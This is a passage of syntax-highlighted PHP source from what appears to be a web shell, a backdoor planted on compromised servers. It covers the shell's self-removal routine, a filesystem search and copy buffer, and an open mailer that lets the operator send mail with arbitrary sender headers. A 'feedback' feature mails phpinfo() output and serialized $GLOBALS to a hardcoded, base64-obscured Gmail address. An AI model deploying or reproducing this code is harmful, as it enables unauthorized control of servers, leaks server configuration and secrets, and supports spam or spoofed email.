<span class="lineno">1330</span>       <span class="k">elseif</span> <span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;%&quot;</span><span class="o">.</span><span class="nv">$hex</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1331</span>     <span class="p">}</span>
<span class="lineno">1332</span>     <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1333</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1334</span> 
<span class="lineno">1335</span> 
<span class="lineno">1336</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1337</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno">1338</span> <span class="x">&lt;/form&gt;</span>
<span class="lineno">1339</span> <span class="cp">&lt;?php</span>
<span class="lineno">1340</span>   <span class="p">}</span>
<span class="lineno">1341</span>   <span class="c1">###[ FILESYSTEM BUFFER ]###</span>
<span class="lineno">1342</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;fsbuff&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1343</span>     <span class="nv">$arr_copy</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">];</span>
<span class="lineno">1344</span>     <span class="nv">$arr_cut</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">];</span>
<span class="lineno">1345</span>     <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$arr_copy</span><span class="p">,</span><span class="nv">$arr_cut</span><span class="p">);</span>
<span class="lineno">1346</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$arr</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;&lt;center&gt;Buffer is empty!&lt;/center&gt;&lt;/h2&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1347</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1348</span>       <span class="nv">$fx_infohead</span> <span class="o">=</span> <span class="s2">&quot;File-System Buffer&quot;</span><span class="p">;</span>
<span class="lineno">1349</span>       <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">;</span>
<span class="lineno">1350</span>       <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno">1351</span>       <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1352</span>     <span class="p">}</span>
<span class="lineno">1353</span>   <span class="p">}</span>
<span class="lineno">1354</span>   <span class="c1">###[ SELF REMOVE ]###</span>
<span class="lineno">1355</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;selfremove&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1356</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1357</span> 
<span class="lineno">1358</span> 
<span class="lineno">1359</span> <span class="x">&lt;div class=&quot;barheader&quot;&gt;</span>
<span class="lineno">1360</span> <span class="x">    .: SELF KILL :.</span>
<span class="lineno">1361</span> <span class="x">    &lt;hr size=&quot;1&quot; noshade&gt;</span>
<span class="lineno">1362</span> <span class="cp">&lt;?php</span>
<span class="lineno">1363</span>     <span class="k">if</span> <span class="p">((</span><span class="o">@</span><span class="nv">$submit</span> <span class="o">==</span> <span class="o">@</span><span class="nv">$rndcode</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">@</span><span class="nv">$submit</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1364</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">unlink</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">))</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="s2">&quot;Thanks for using &quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;!&quot;</span><span class="p">;</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno">1365</span>       <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Can&#39;t delete &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;!&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1366</span>     <span class="p">}</span>
<span class="lineno">1367</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1368</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$rndcode</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Error: Incorrect confirmation code!&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1369</span>       <span class="nv">$rnd</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">);</span>
<span class="lineno">1370</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1371</span> 
<span class="lineno">1372</span> 
<span class="lineno">1373</span> <span class="x">&lt;form name=&quot;f_killshell&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">1374</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;selfremove&quot;&gt;</span>
<span class="lineno">1375</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;rndcode&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$rnd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">1376</span> <span class="x">    Are you sure want to remove this shell ?&lt;br&gt;</span>
<span class="lineno">1377</span> <span class="x">    </span><span class="cp">&lt;?php</span> <span class="nx">disp_error</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1378</span> 
<span class="lineno">1379</span> 
<span class="lineno">1380</span> <span class="x">    &lt;br&gt;For confirmation, enter &quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$rnd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&lt;br&gt;</span>
<span class="lineno">1381</span> <span class="x">    &lt;input type=&quot;text&quot; name=&quot;submit&quot;&gt;&lt;br&gt;</span>
<span class="lineno">1382</span> <span class="x">    &lt;input type=&quot;submit&quot; value=&quot;KILL&quot;&gt;</span>
<span class="lineno">1383</span> <span class="x">&lt;/form&gt;</span>
<span class="lineno">1384</span> <span class="x">&lt;/div&gt;</span>
<span class="lineno">1385</span> <span class="cp">&lt;?php</span>
<span class="lineno">1386</span>     <span class="p">}</span>
<span class="lineno">1387</span>   <span class="p">}</span>
<span class="lineno">1388</span>   <span class="c1">###[ FEEDBACK ]###</span>
<span class="lineno">1389</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;feedback&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1390</span>     <span class="nv">$suppmail</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;ZmVlbGNvbXpAZ21haWwuY29t&quot;</span><span class="p">);</span>
<span class="lineno">1391</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1392</span>       <span class="nv">$ticket</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">microtime</span><span class="p">()</span><span class="o">+</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)),</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
<span class="lineno">1393</span>       <span class="nv">$body</span> <span class="o">=</span> <span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; feedback #&quot;</span><span class="o">.</span><span class="nv">$ticket</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Name: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$fdbk_name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">E-mail: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$fdbk_email</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Message:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$fdbk_body</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">IP: &quot;</span><span class="o">.</span><span class="nv">$REMOTE_ADDR</span><span class="p">;</span>
<span class="lineno">1394</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fdbk_ref</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1395</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
<span class="lineno">1396</span>         <span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">1397</span>         <span class="nb">phpinfo</span><span class="p">();</span>
<span class="lineno">1398</span>         <span class="nv">$phpinfo</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">ob_get_contents</span><span class="p">());</span>
<span class="lineno">1399</span>         <span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">1400</span>         <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
<span class="lineno">1401</span>         <span class="nv">$body</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s2">&quot;phpinfo(): &quot;</span><span class="o">.</span><span class="nv">$phpinfo</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">GLOBALS=&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1402</span>       <span class="p">}</span>
<span class="lineno">1403</span>       <span class="nb">mail</span><span class="p">(</span><span class="nv">$suppmail</span><span class="p">,</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; feedback #&quot;</span><span class="o">.</span><span class="nv">$ticket</span><span class="p">,</span><span class="nv">$body</span><span class="p">,</span><span class="s2">&quot;FROM: &quot;</span><span class="o">.</span><span class="nv">$suppmail</span><span class="p">);</span>
<span class="lineno">1404</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Thanks for your feedback! Your ticket ID: &quot;</span><span class="o">.</span><span class="nv">$ticket</span><span class="o">.</span><span class="s2">&quot;.&lt;/b&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1405</span>     <span class="p">}</span>
<span class="lineno">1406</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1407</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1408</span> 
<span class="lineno">1409</span> 
<span class="lineno">1410</span> <span class="x">&lt;div class=&quot;barheader&quot;&gt;.: Feedback or report bug (</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;@&quot;</span><span class="p">,</span><span class="s2">&quot;.&quot;</span><span class="p">),</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;[at]&quot;</span><span class="p">,</span><span class="s2">&quot;[dot]&quot;</span><span class="p">),</span><span class="nv">$suppmail</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">) :.&lt;/div&gt;</span>
<span class="lineno">1411</span> <span class="x">&lt;form name=&quot;f_feedback&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">1412</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;feedback&quot;&gt;</span>
<span class="lineno">1413</span> <span class="x">    &lt;table class=&quot;contents&quot;&gt;</span>
<span class="lineno">1414</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Your name:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;fdbk_name&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$fdbk_name</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&lt;/tr&gt;</span>
<span class="lineno">1415</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Your e-mail:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;fdbk_email&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$fdbk_email</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1416</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Message:&lt;/th&gt;&lt;td&gt;&lt;textarea name=&quot;fdbk_body&quot; cols=80 rows=10&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$fdbk_body</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;</span>
<span class="lineno">1417</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;fdbk_ref&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$HTTP_REFERER</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;br&gt;</span>
<span class="lineno">1418</span> <span class="x">        &lt;input type=&quot;checkbox&quot; name=&quot;fdbk_servinf&quot; value=&quot;1&quot; checked&gt; Attach Server info (Recommended for bug-fix)&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1419</span> <span class="x">        &lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Send&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1420</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno">1421</span> <span class="x">&lt;/form&gt;</span>
<span class="lineno">1422</span> <span class="cp">&lt;?php</span>
<span class="lineno">1423</span>     <span class="p">}</span>
<span class="lineno">1424</span>   <span class="p">}</span>
<span class="lineno">1425</span>   <span class="c1">###[ PHP MAILER (By FaTaLisTiCz_Fx) ]###</span>
<span class="lineno">1426</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;fxmailer&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1427</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1428</span> 
<span class="lineno">1429</span> 
<span class="lineno">1430</span> <span class="x">    &lt;div class=&quot;barheader&quot;&gt;.: Mailer :.&lt;/div&gt;</span>
<span class="lineno">1431</span> <span class="cp">&lt;?php</span>
<span class="lineno">1432</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">)){</span>
<span class="lineno">1433</span>       <span class="nv">$headers</span>  <span class="o">=</span> <span class="s1">&#39;To: &#39;</span><span class="o">.</span><span class="nv">$dest_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1434</span>       <span class="nv">$headers</span> <span class="o">.=</span> <span class="s1">&#39;From: &#39;</span><span class="o">.</span><span class="nv">$sender_name</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$sender_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1435</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$dest_email</span><span class="p">,</span><span class="nv">$sender_subj</span><span class="p">,</span><span class="nv">$sender_body</span><span class="p">,</span><span class="nv">$headers</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1436</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Email sent to </span><span class="si">$dest_email</span><span class="s2">!&lt;/b&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1437</span>       <span class="p">}</span>
<span class="lineno">1438</span>       <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Can&#39;t send email!&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1439</span>     <span class="p">}</span>
<span class="lineno">1440</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1441</span>   <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1442</span> 
<span class="lineno">1443</span> 
<span class="lineno">1444</span> <span class="x">&lt;form name=&quot;f_mailer&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">1445</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;fxmailer&quot;&gt;</span>
<span class="lineno">1446</span> <span class="x">    &lt;table class=&quot;contents&quot;&gt;</span>
<span class="lineno">1447</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Your name:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sender_name&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_name</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1448</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Your e-mail:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sender_email&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_email</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1449</span> <span class="x">        &lt;tr&gt;&lt;th&gt;To:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;dest_email&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dest_email</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1450</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Subject:&lt;/th&gt;&lt;td&gt;&lt;input size=&quot;70&quot; type=&quot;text&quot; name=&quot;sender_subj&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_subj</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1451</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Message:&lt;/th&gt;&lt;td&gt;&lt;textarea name=&quot;sender_body&quot; cols=&quot;80&quot; rows=&quot;10&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_body</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1452</span> <span class="x">        &lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Send&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1453</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno">1454</span> <span class="x">&lt;/form&gt;</span>
<span class="lineno">1455</span> <span class="cp">&lt;?php</span>
<span class="lineno">1456</span>     <span class="p">}</span>
<span class="lineno">1457</span>   <span class="p">}</span>
<span class="lineno">1458</span>   <span class="c1">###[ SEARCH ]###</span>
<span class="lineno">1459</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;search&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1460</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1461</span> 
<span class="lineno">1462</span> 
<span class="lineno">1463</span> <span class="x">&lt;div class=barheader&gt;.: Filesystem Search :.&lt;/div&gt;</span>
<span class="lineno">1464</span> <span class="cp">&lt;?php</span>
<span class="lineno">1465</span>     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_in</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;}</span>
<span class="lineno">1466</span>     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_name</span> <span class="o">=</span> <span class="s2">&quot;(.*)&quot;</span><span class="p">;</span> <span class="nv">$search_name_regexp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span>
<span class="lineno">1467</span>     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_text_wwo</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_text_regexp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
<span class="lineno">1468</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1469</span>       <span class="nv">$found</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1470</span>       <span class="nv">$found_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1471</span>       <span class="nv">$found_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1472</span>       <span class="nv">$search_i_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1473</span>       <span class="nv">$search_i_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1474</span>       <span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">1475</span>           <span class="s2">&quot;name&quot;</span>        <span class="o">=&gt;</span> <span class="o">@</span><span class="nv">$search_name</span><span class="p">,</span>
<span class="lineno">1476</span>           <span class="s2">&quot;name_regexp&quot;</span>    <span class="o">=&gt;</span> <span class="o">@</span><span class="nv">$search_name_regexp</span><span class="p">,</span>
<span class="lineno">1477</span>           <span class="s2">&quot;text&quot;</span>        <span class="o">=&gt;</span> <span class="o">@</span><span class="nv">$search_text</span><span class="p">,</span>
<span class="lineno">1478</span>           <span class="s2">&quot;text_regexp&quot;</span>    <span class="o">=&gt;</span> <span class="o">@</span><span class="nv">$search_text_regxp</span><span class="p">,</span>
<span class="lineno">1479</span>           <span class="s2">&quot;text_wwo&quot;</span>    <span class="o">=&gt;</span> <span class="o">@</span><span class="nv">$search_text_wwo</span><span class="p">,</span>
<span class="lineno">1480</span>           <span class="s2">&quot;text_cs&quot;</span>        <span class="o">=&gt;</span> <span class="o">@</span><span class="nv">$search_text_cs</span><span class="p">,</span>
<span class="lineno">1481</span>           <span class="s2">&quot;text_not&quot;</span>    <span class="o">=&gt;</span> <span class="o">@</span><span class="nv">$search_text_not</span>
<span class="lineno">1482</span>       <span class="p">);</span>
<span class="lineno">1483</span>       <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
<span class="lineno">1484</span>       <span class="nv">$in</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$search_in</span><span class="p">));</span>
<span class="lineno">1485</span>       <span class="k">foreach</span><span class="p">(</span><span class="nv">$in</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nx">fx29fsearch</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1486</span>       <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="lineno">1487</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$found</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No files found!&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1488</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1489</span>         <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$found</span><span class="p">;</span>
<span class="lineno">1490</span>         <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno">1491</span>         <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1492</span>       <span class="p">}</span>
<span class="lineno">1493</span>     <span class="p">}</span>
<span class="lineno">1494</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1495</span> 
<span class="lineno">1496</span> 
<span class="lineno">1497</span> <span class="x">&lt;form name=&quot;f_search&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">1498</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">1499</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dspact</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">1500</span> <span class="x">    &lt;table class=&quot;contents&quot;&gt;</span>
<span class="lineno">1501</span> <span class="x">        &lt;tr&gt;&lt;th&gt;File or folder Name:&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;search_name&quot; size=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt; &lt;input type=&quot;checkbox&quot; name=&quot;search_name_regexp&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_name_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&gt; Regular 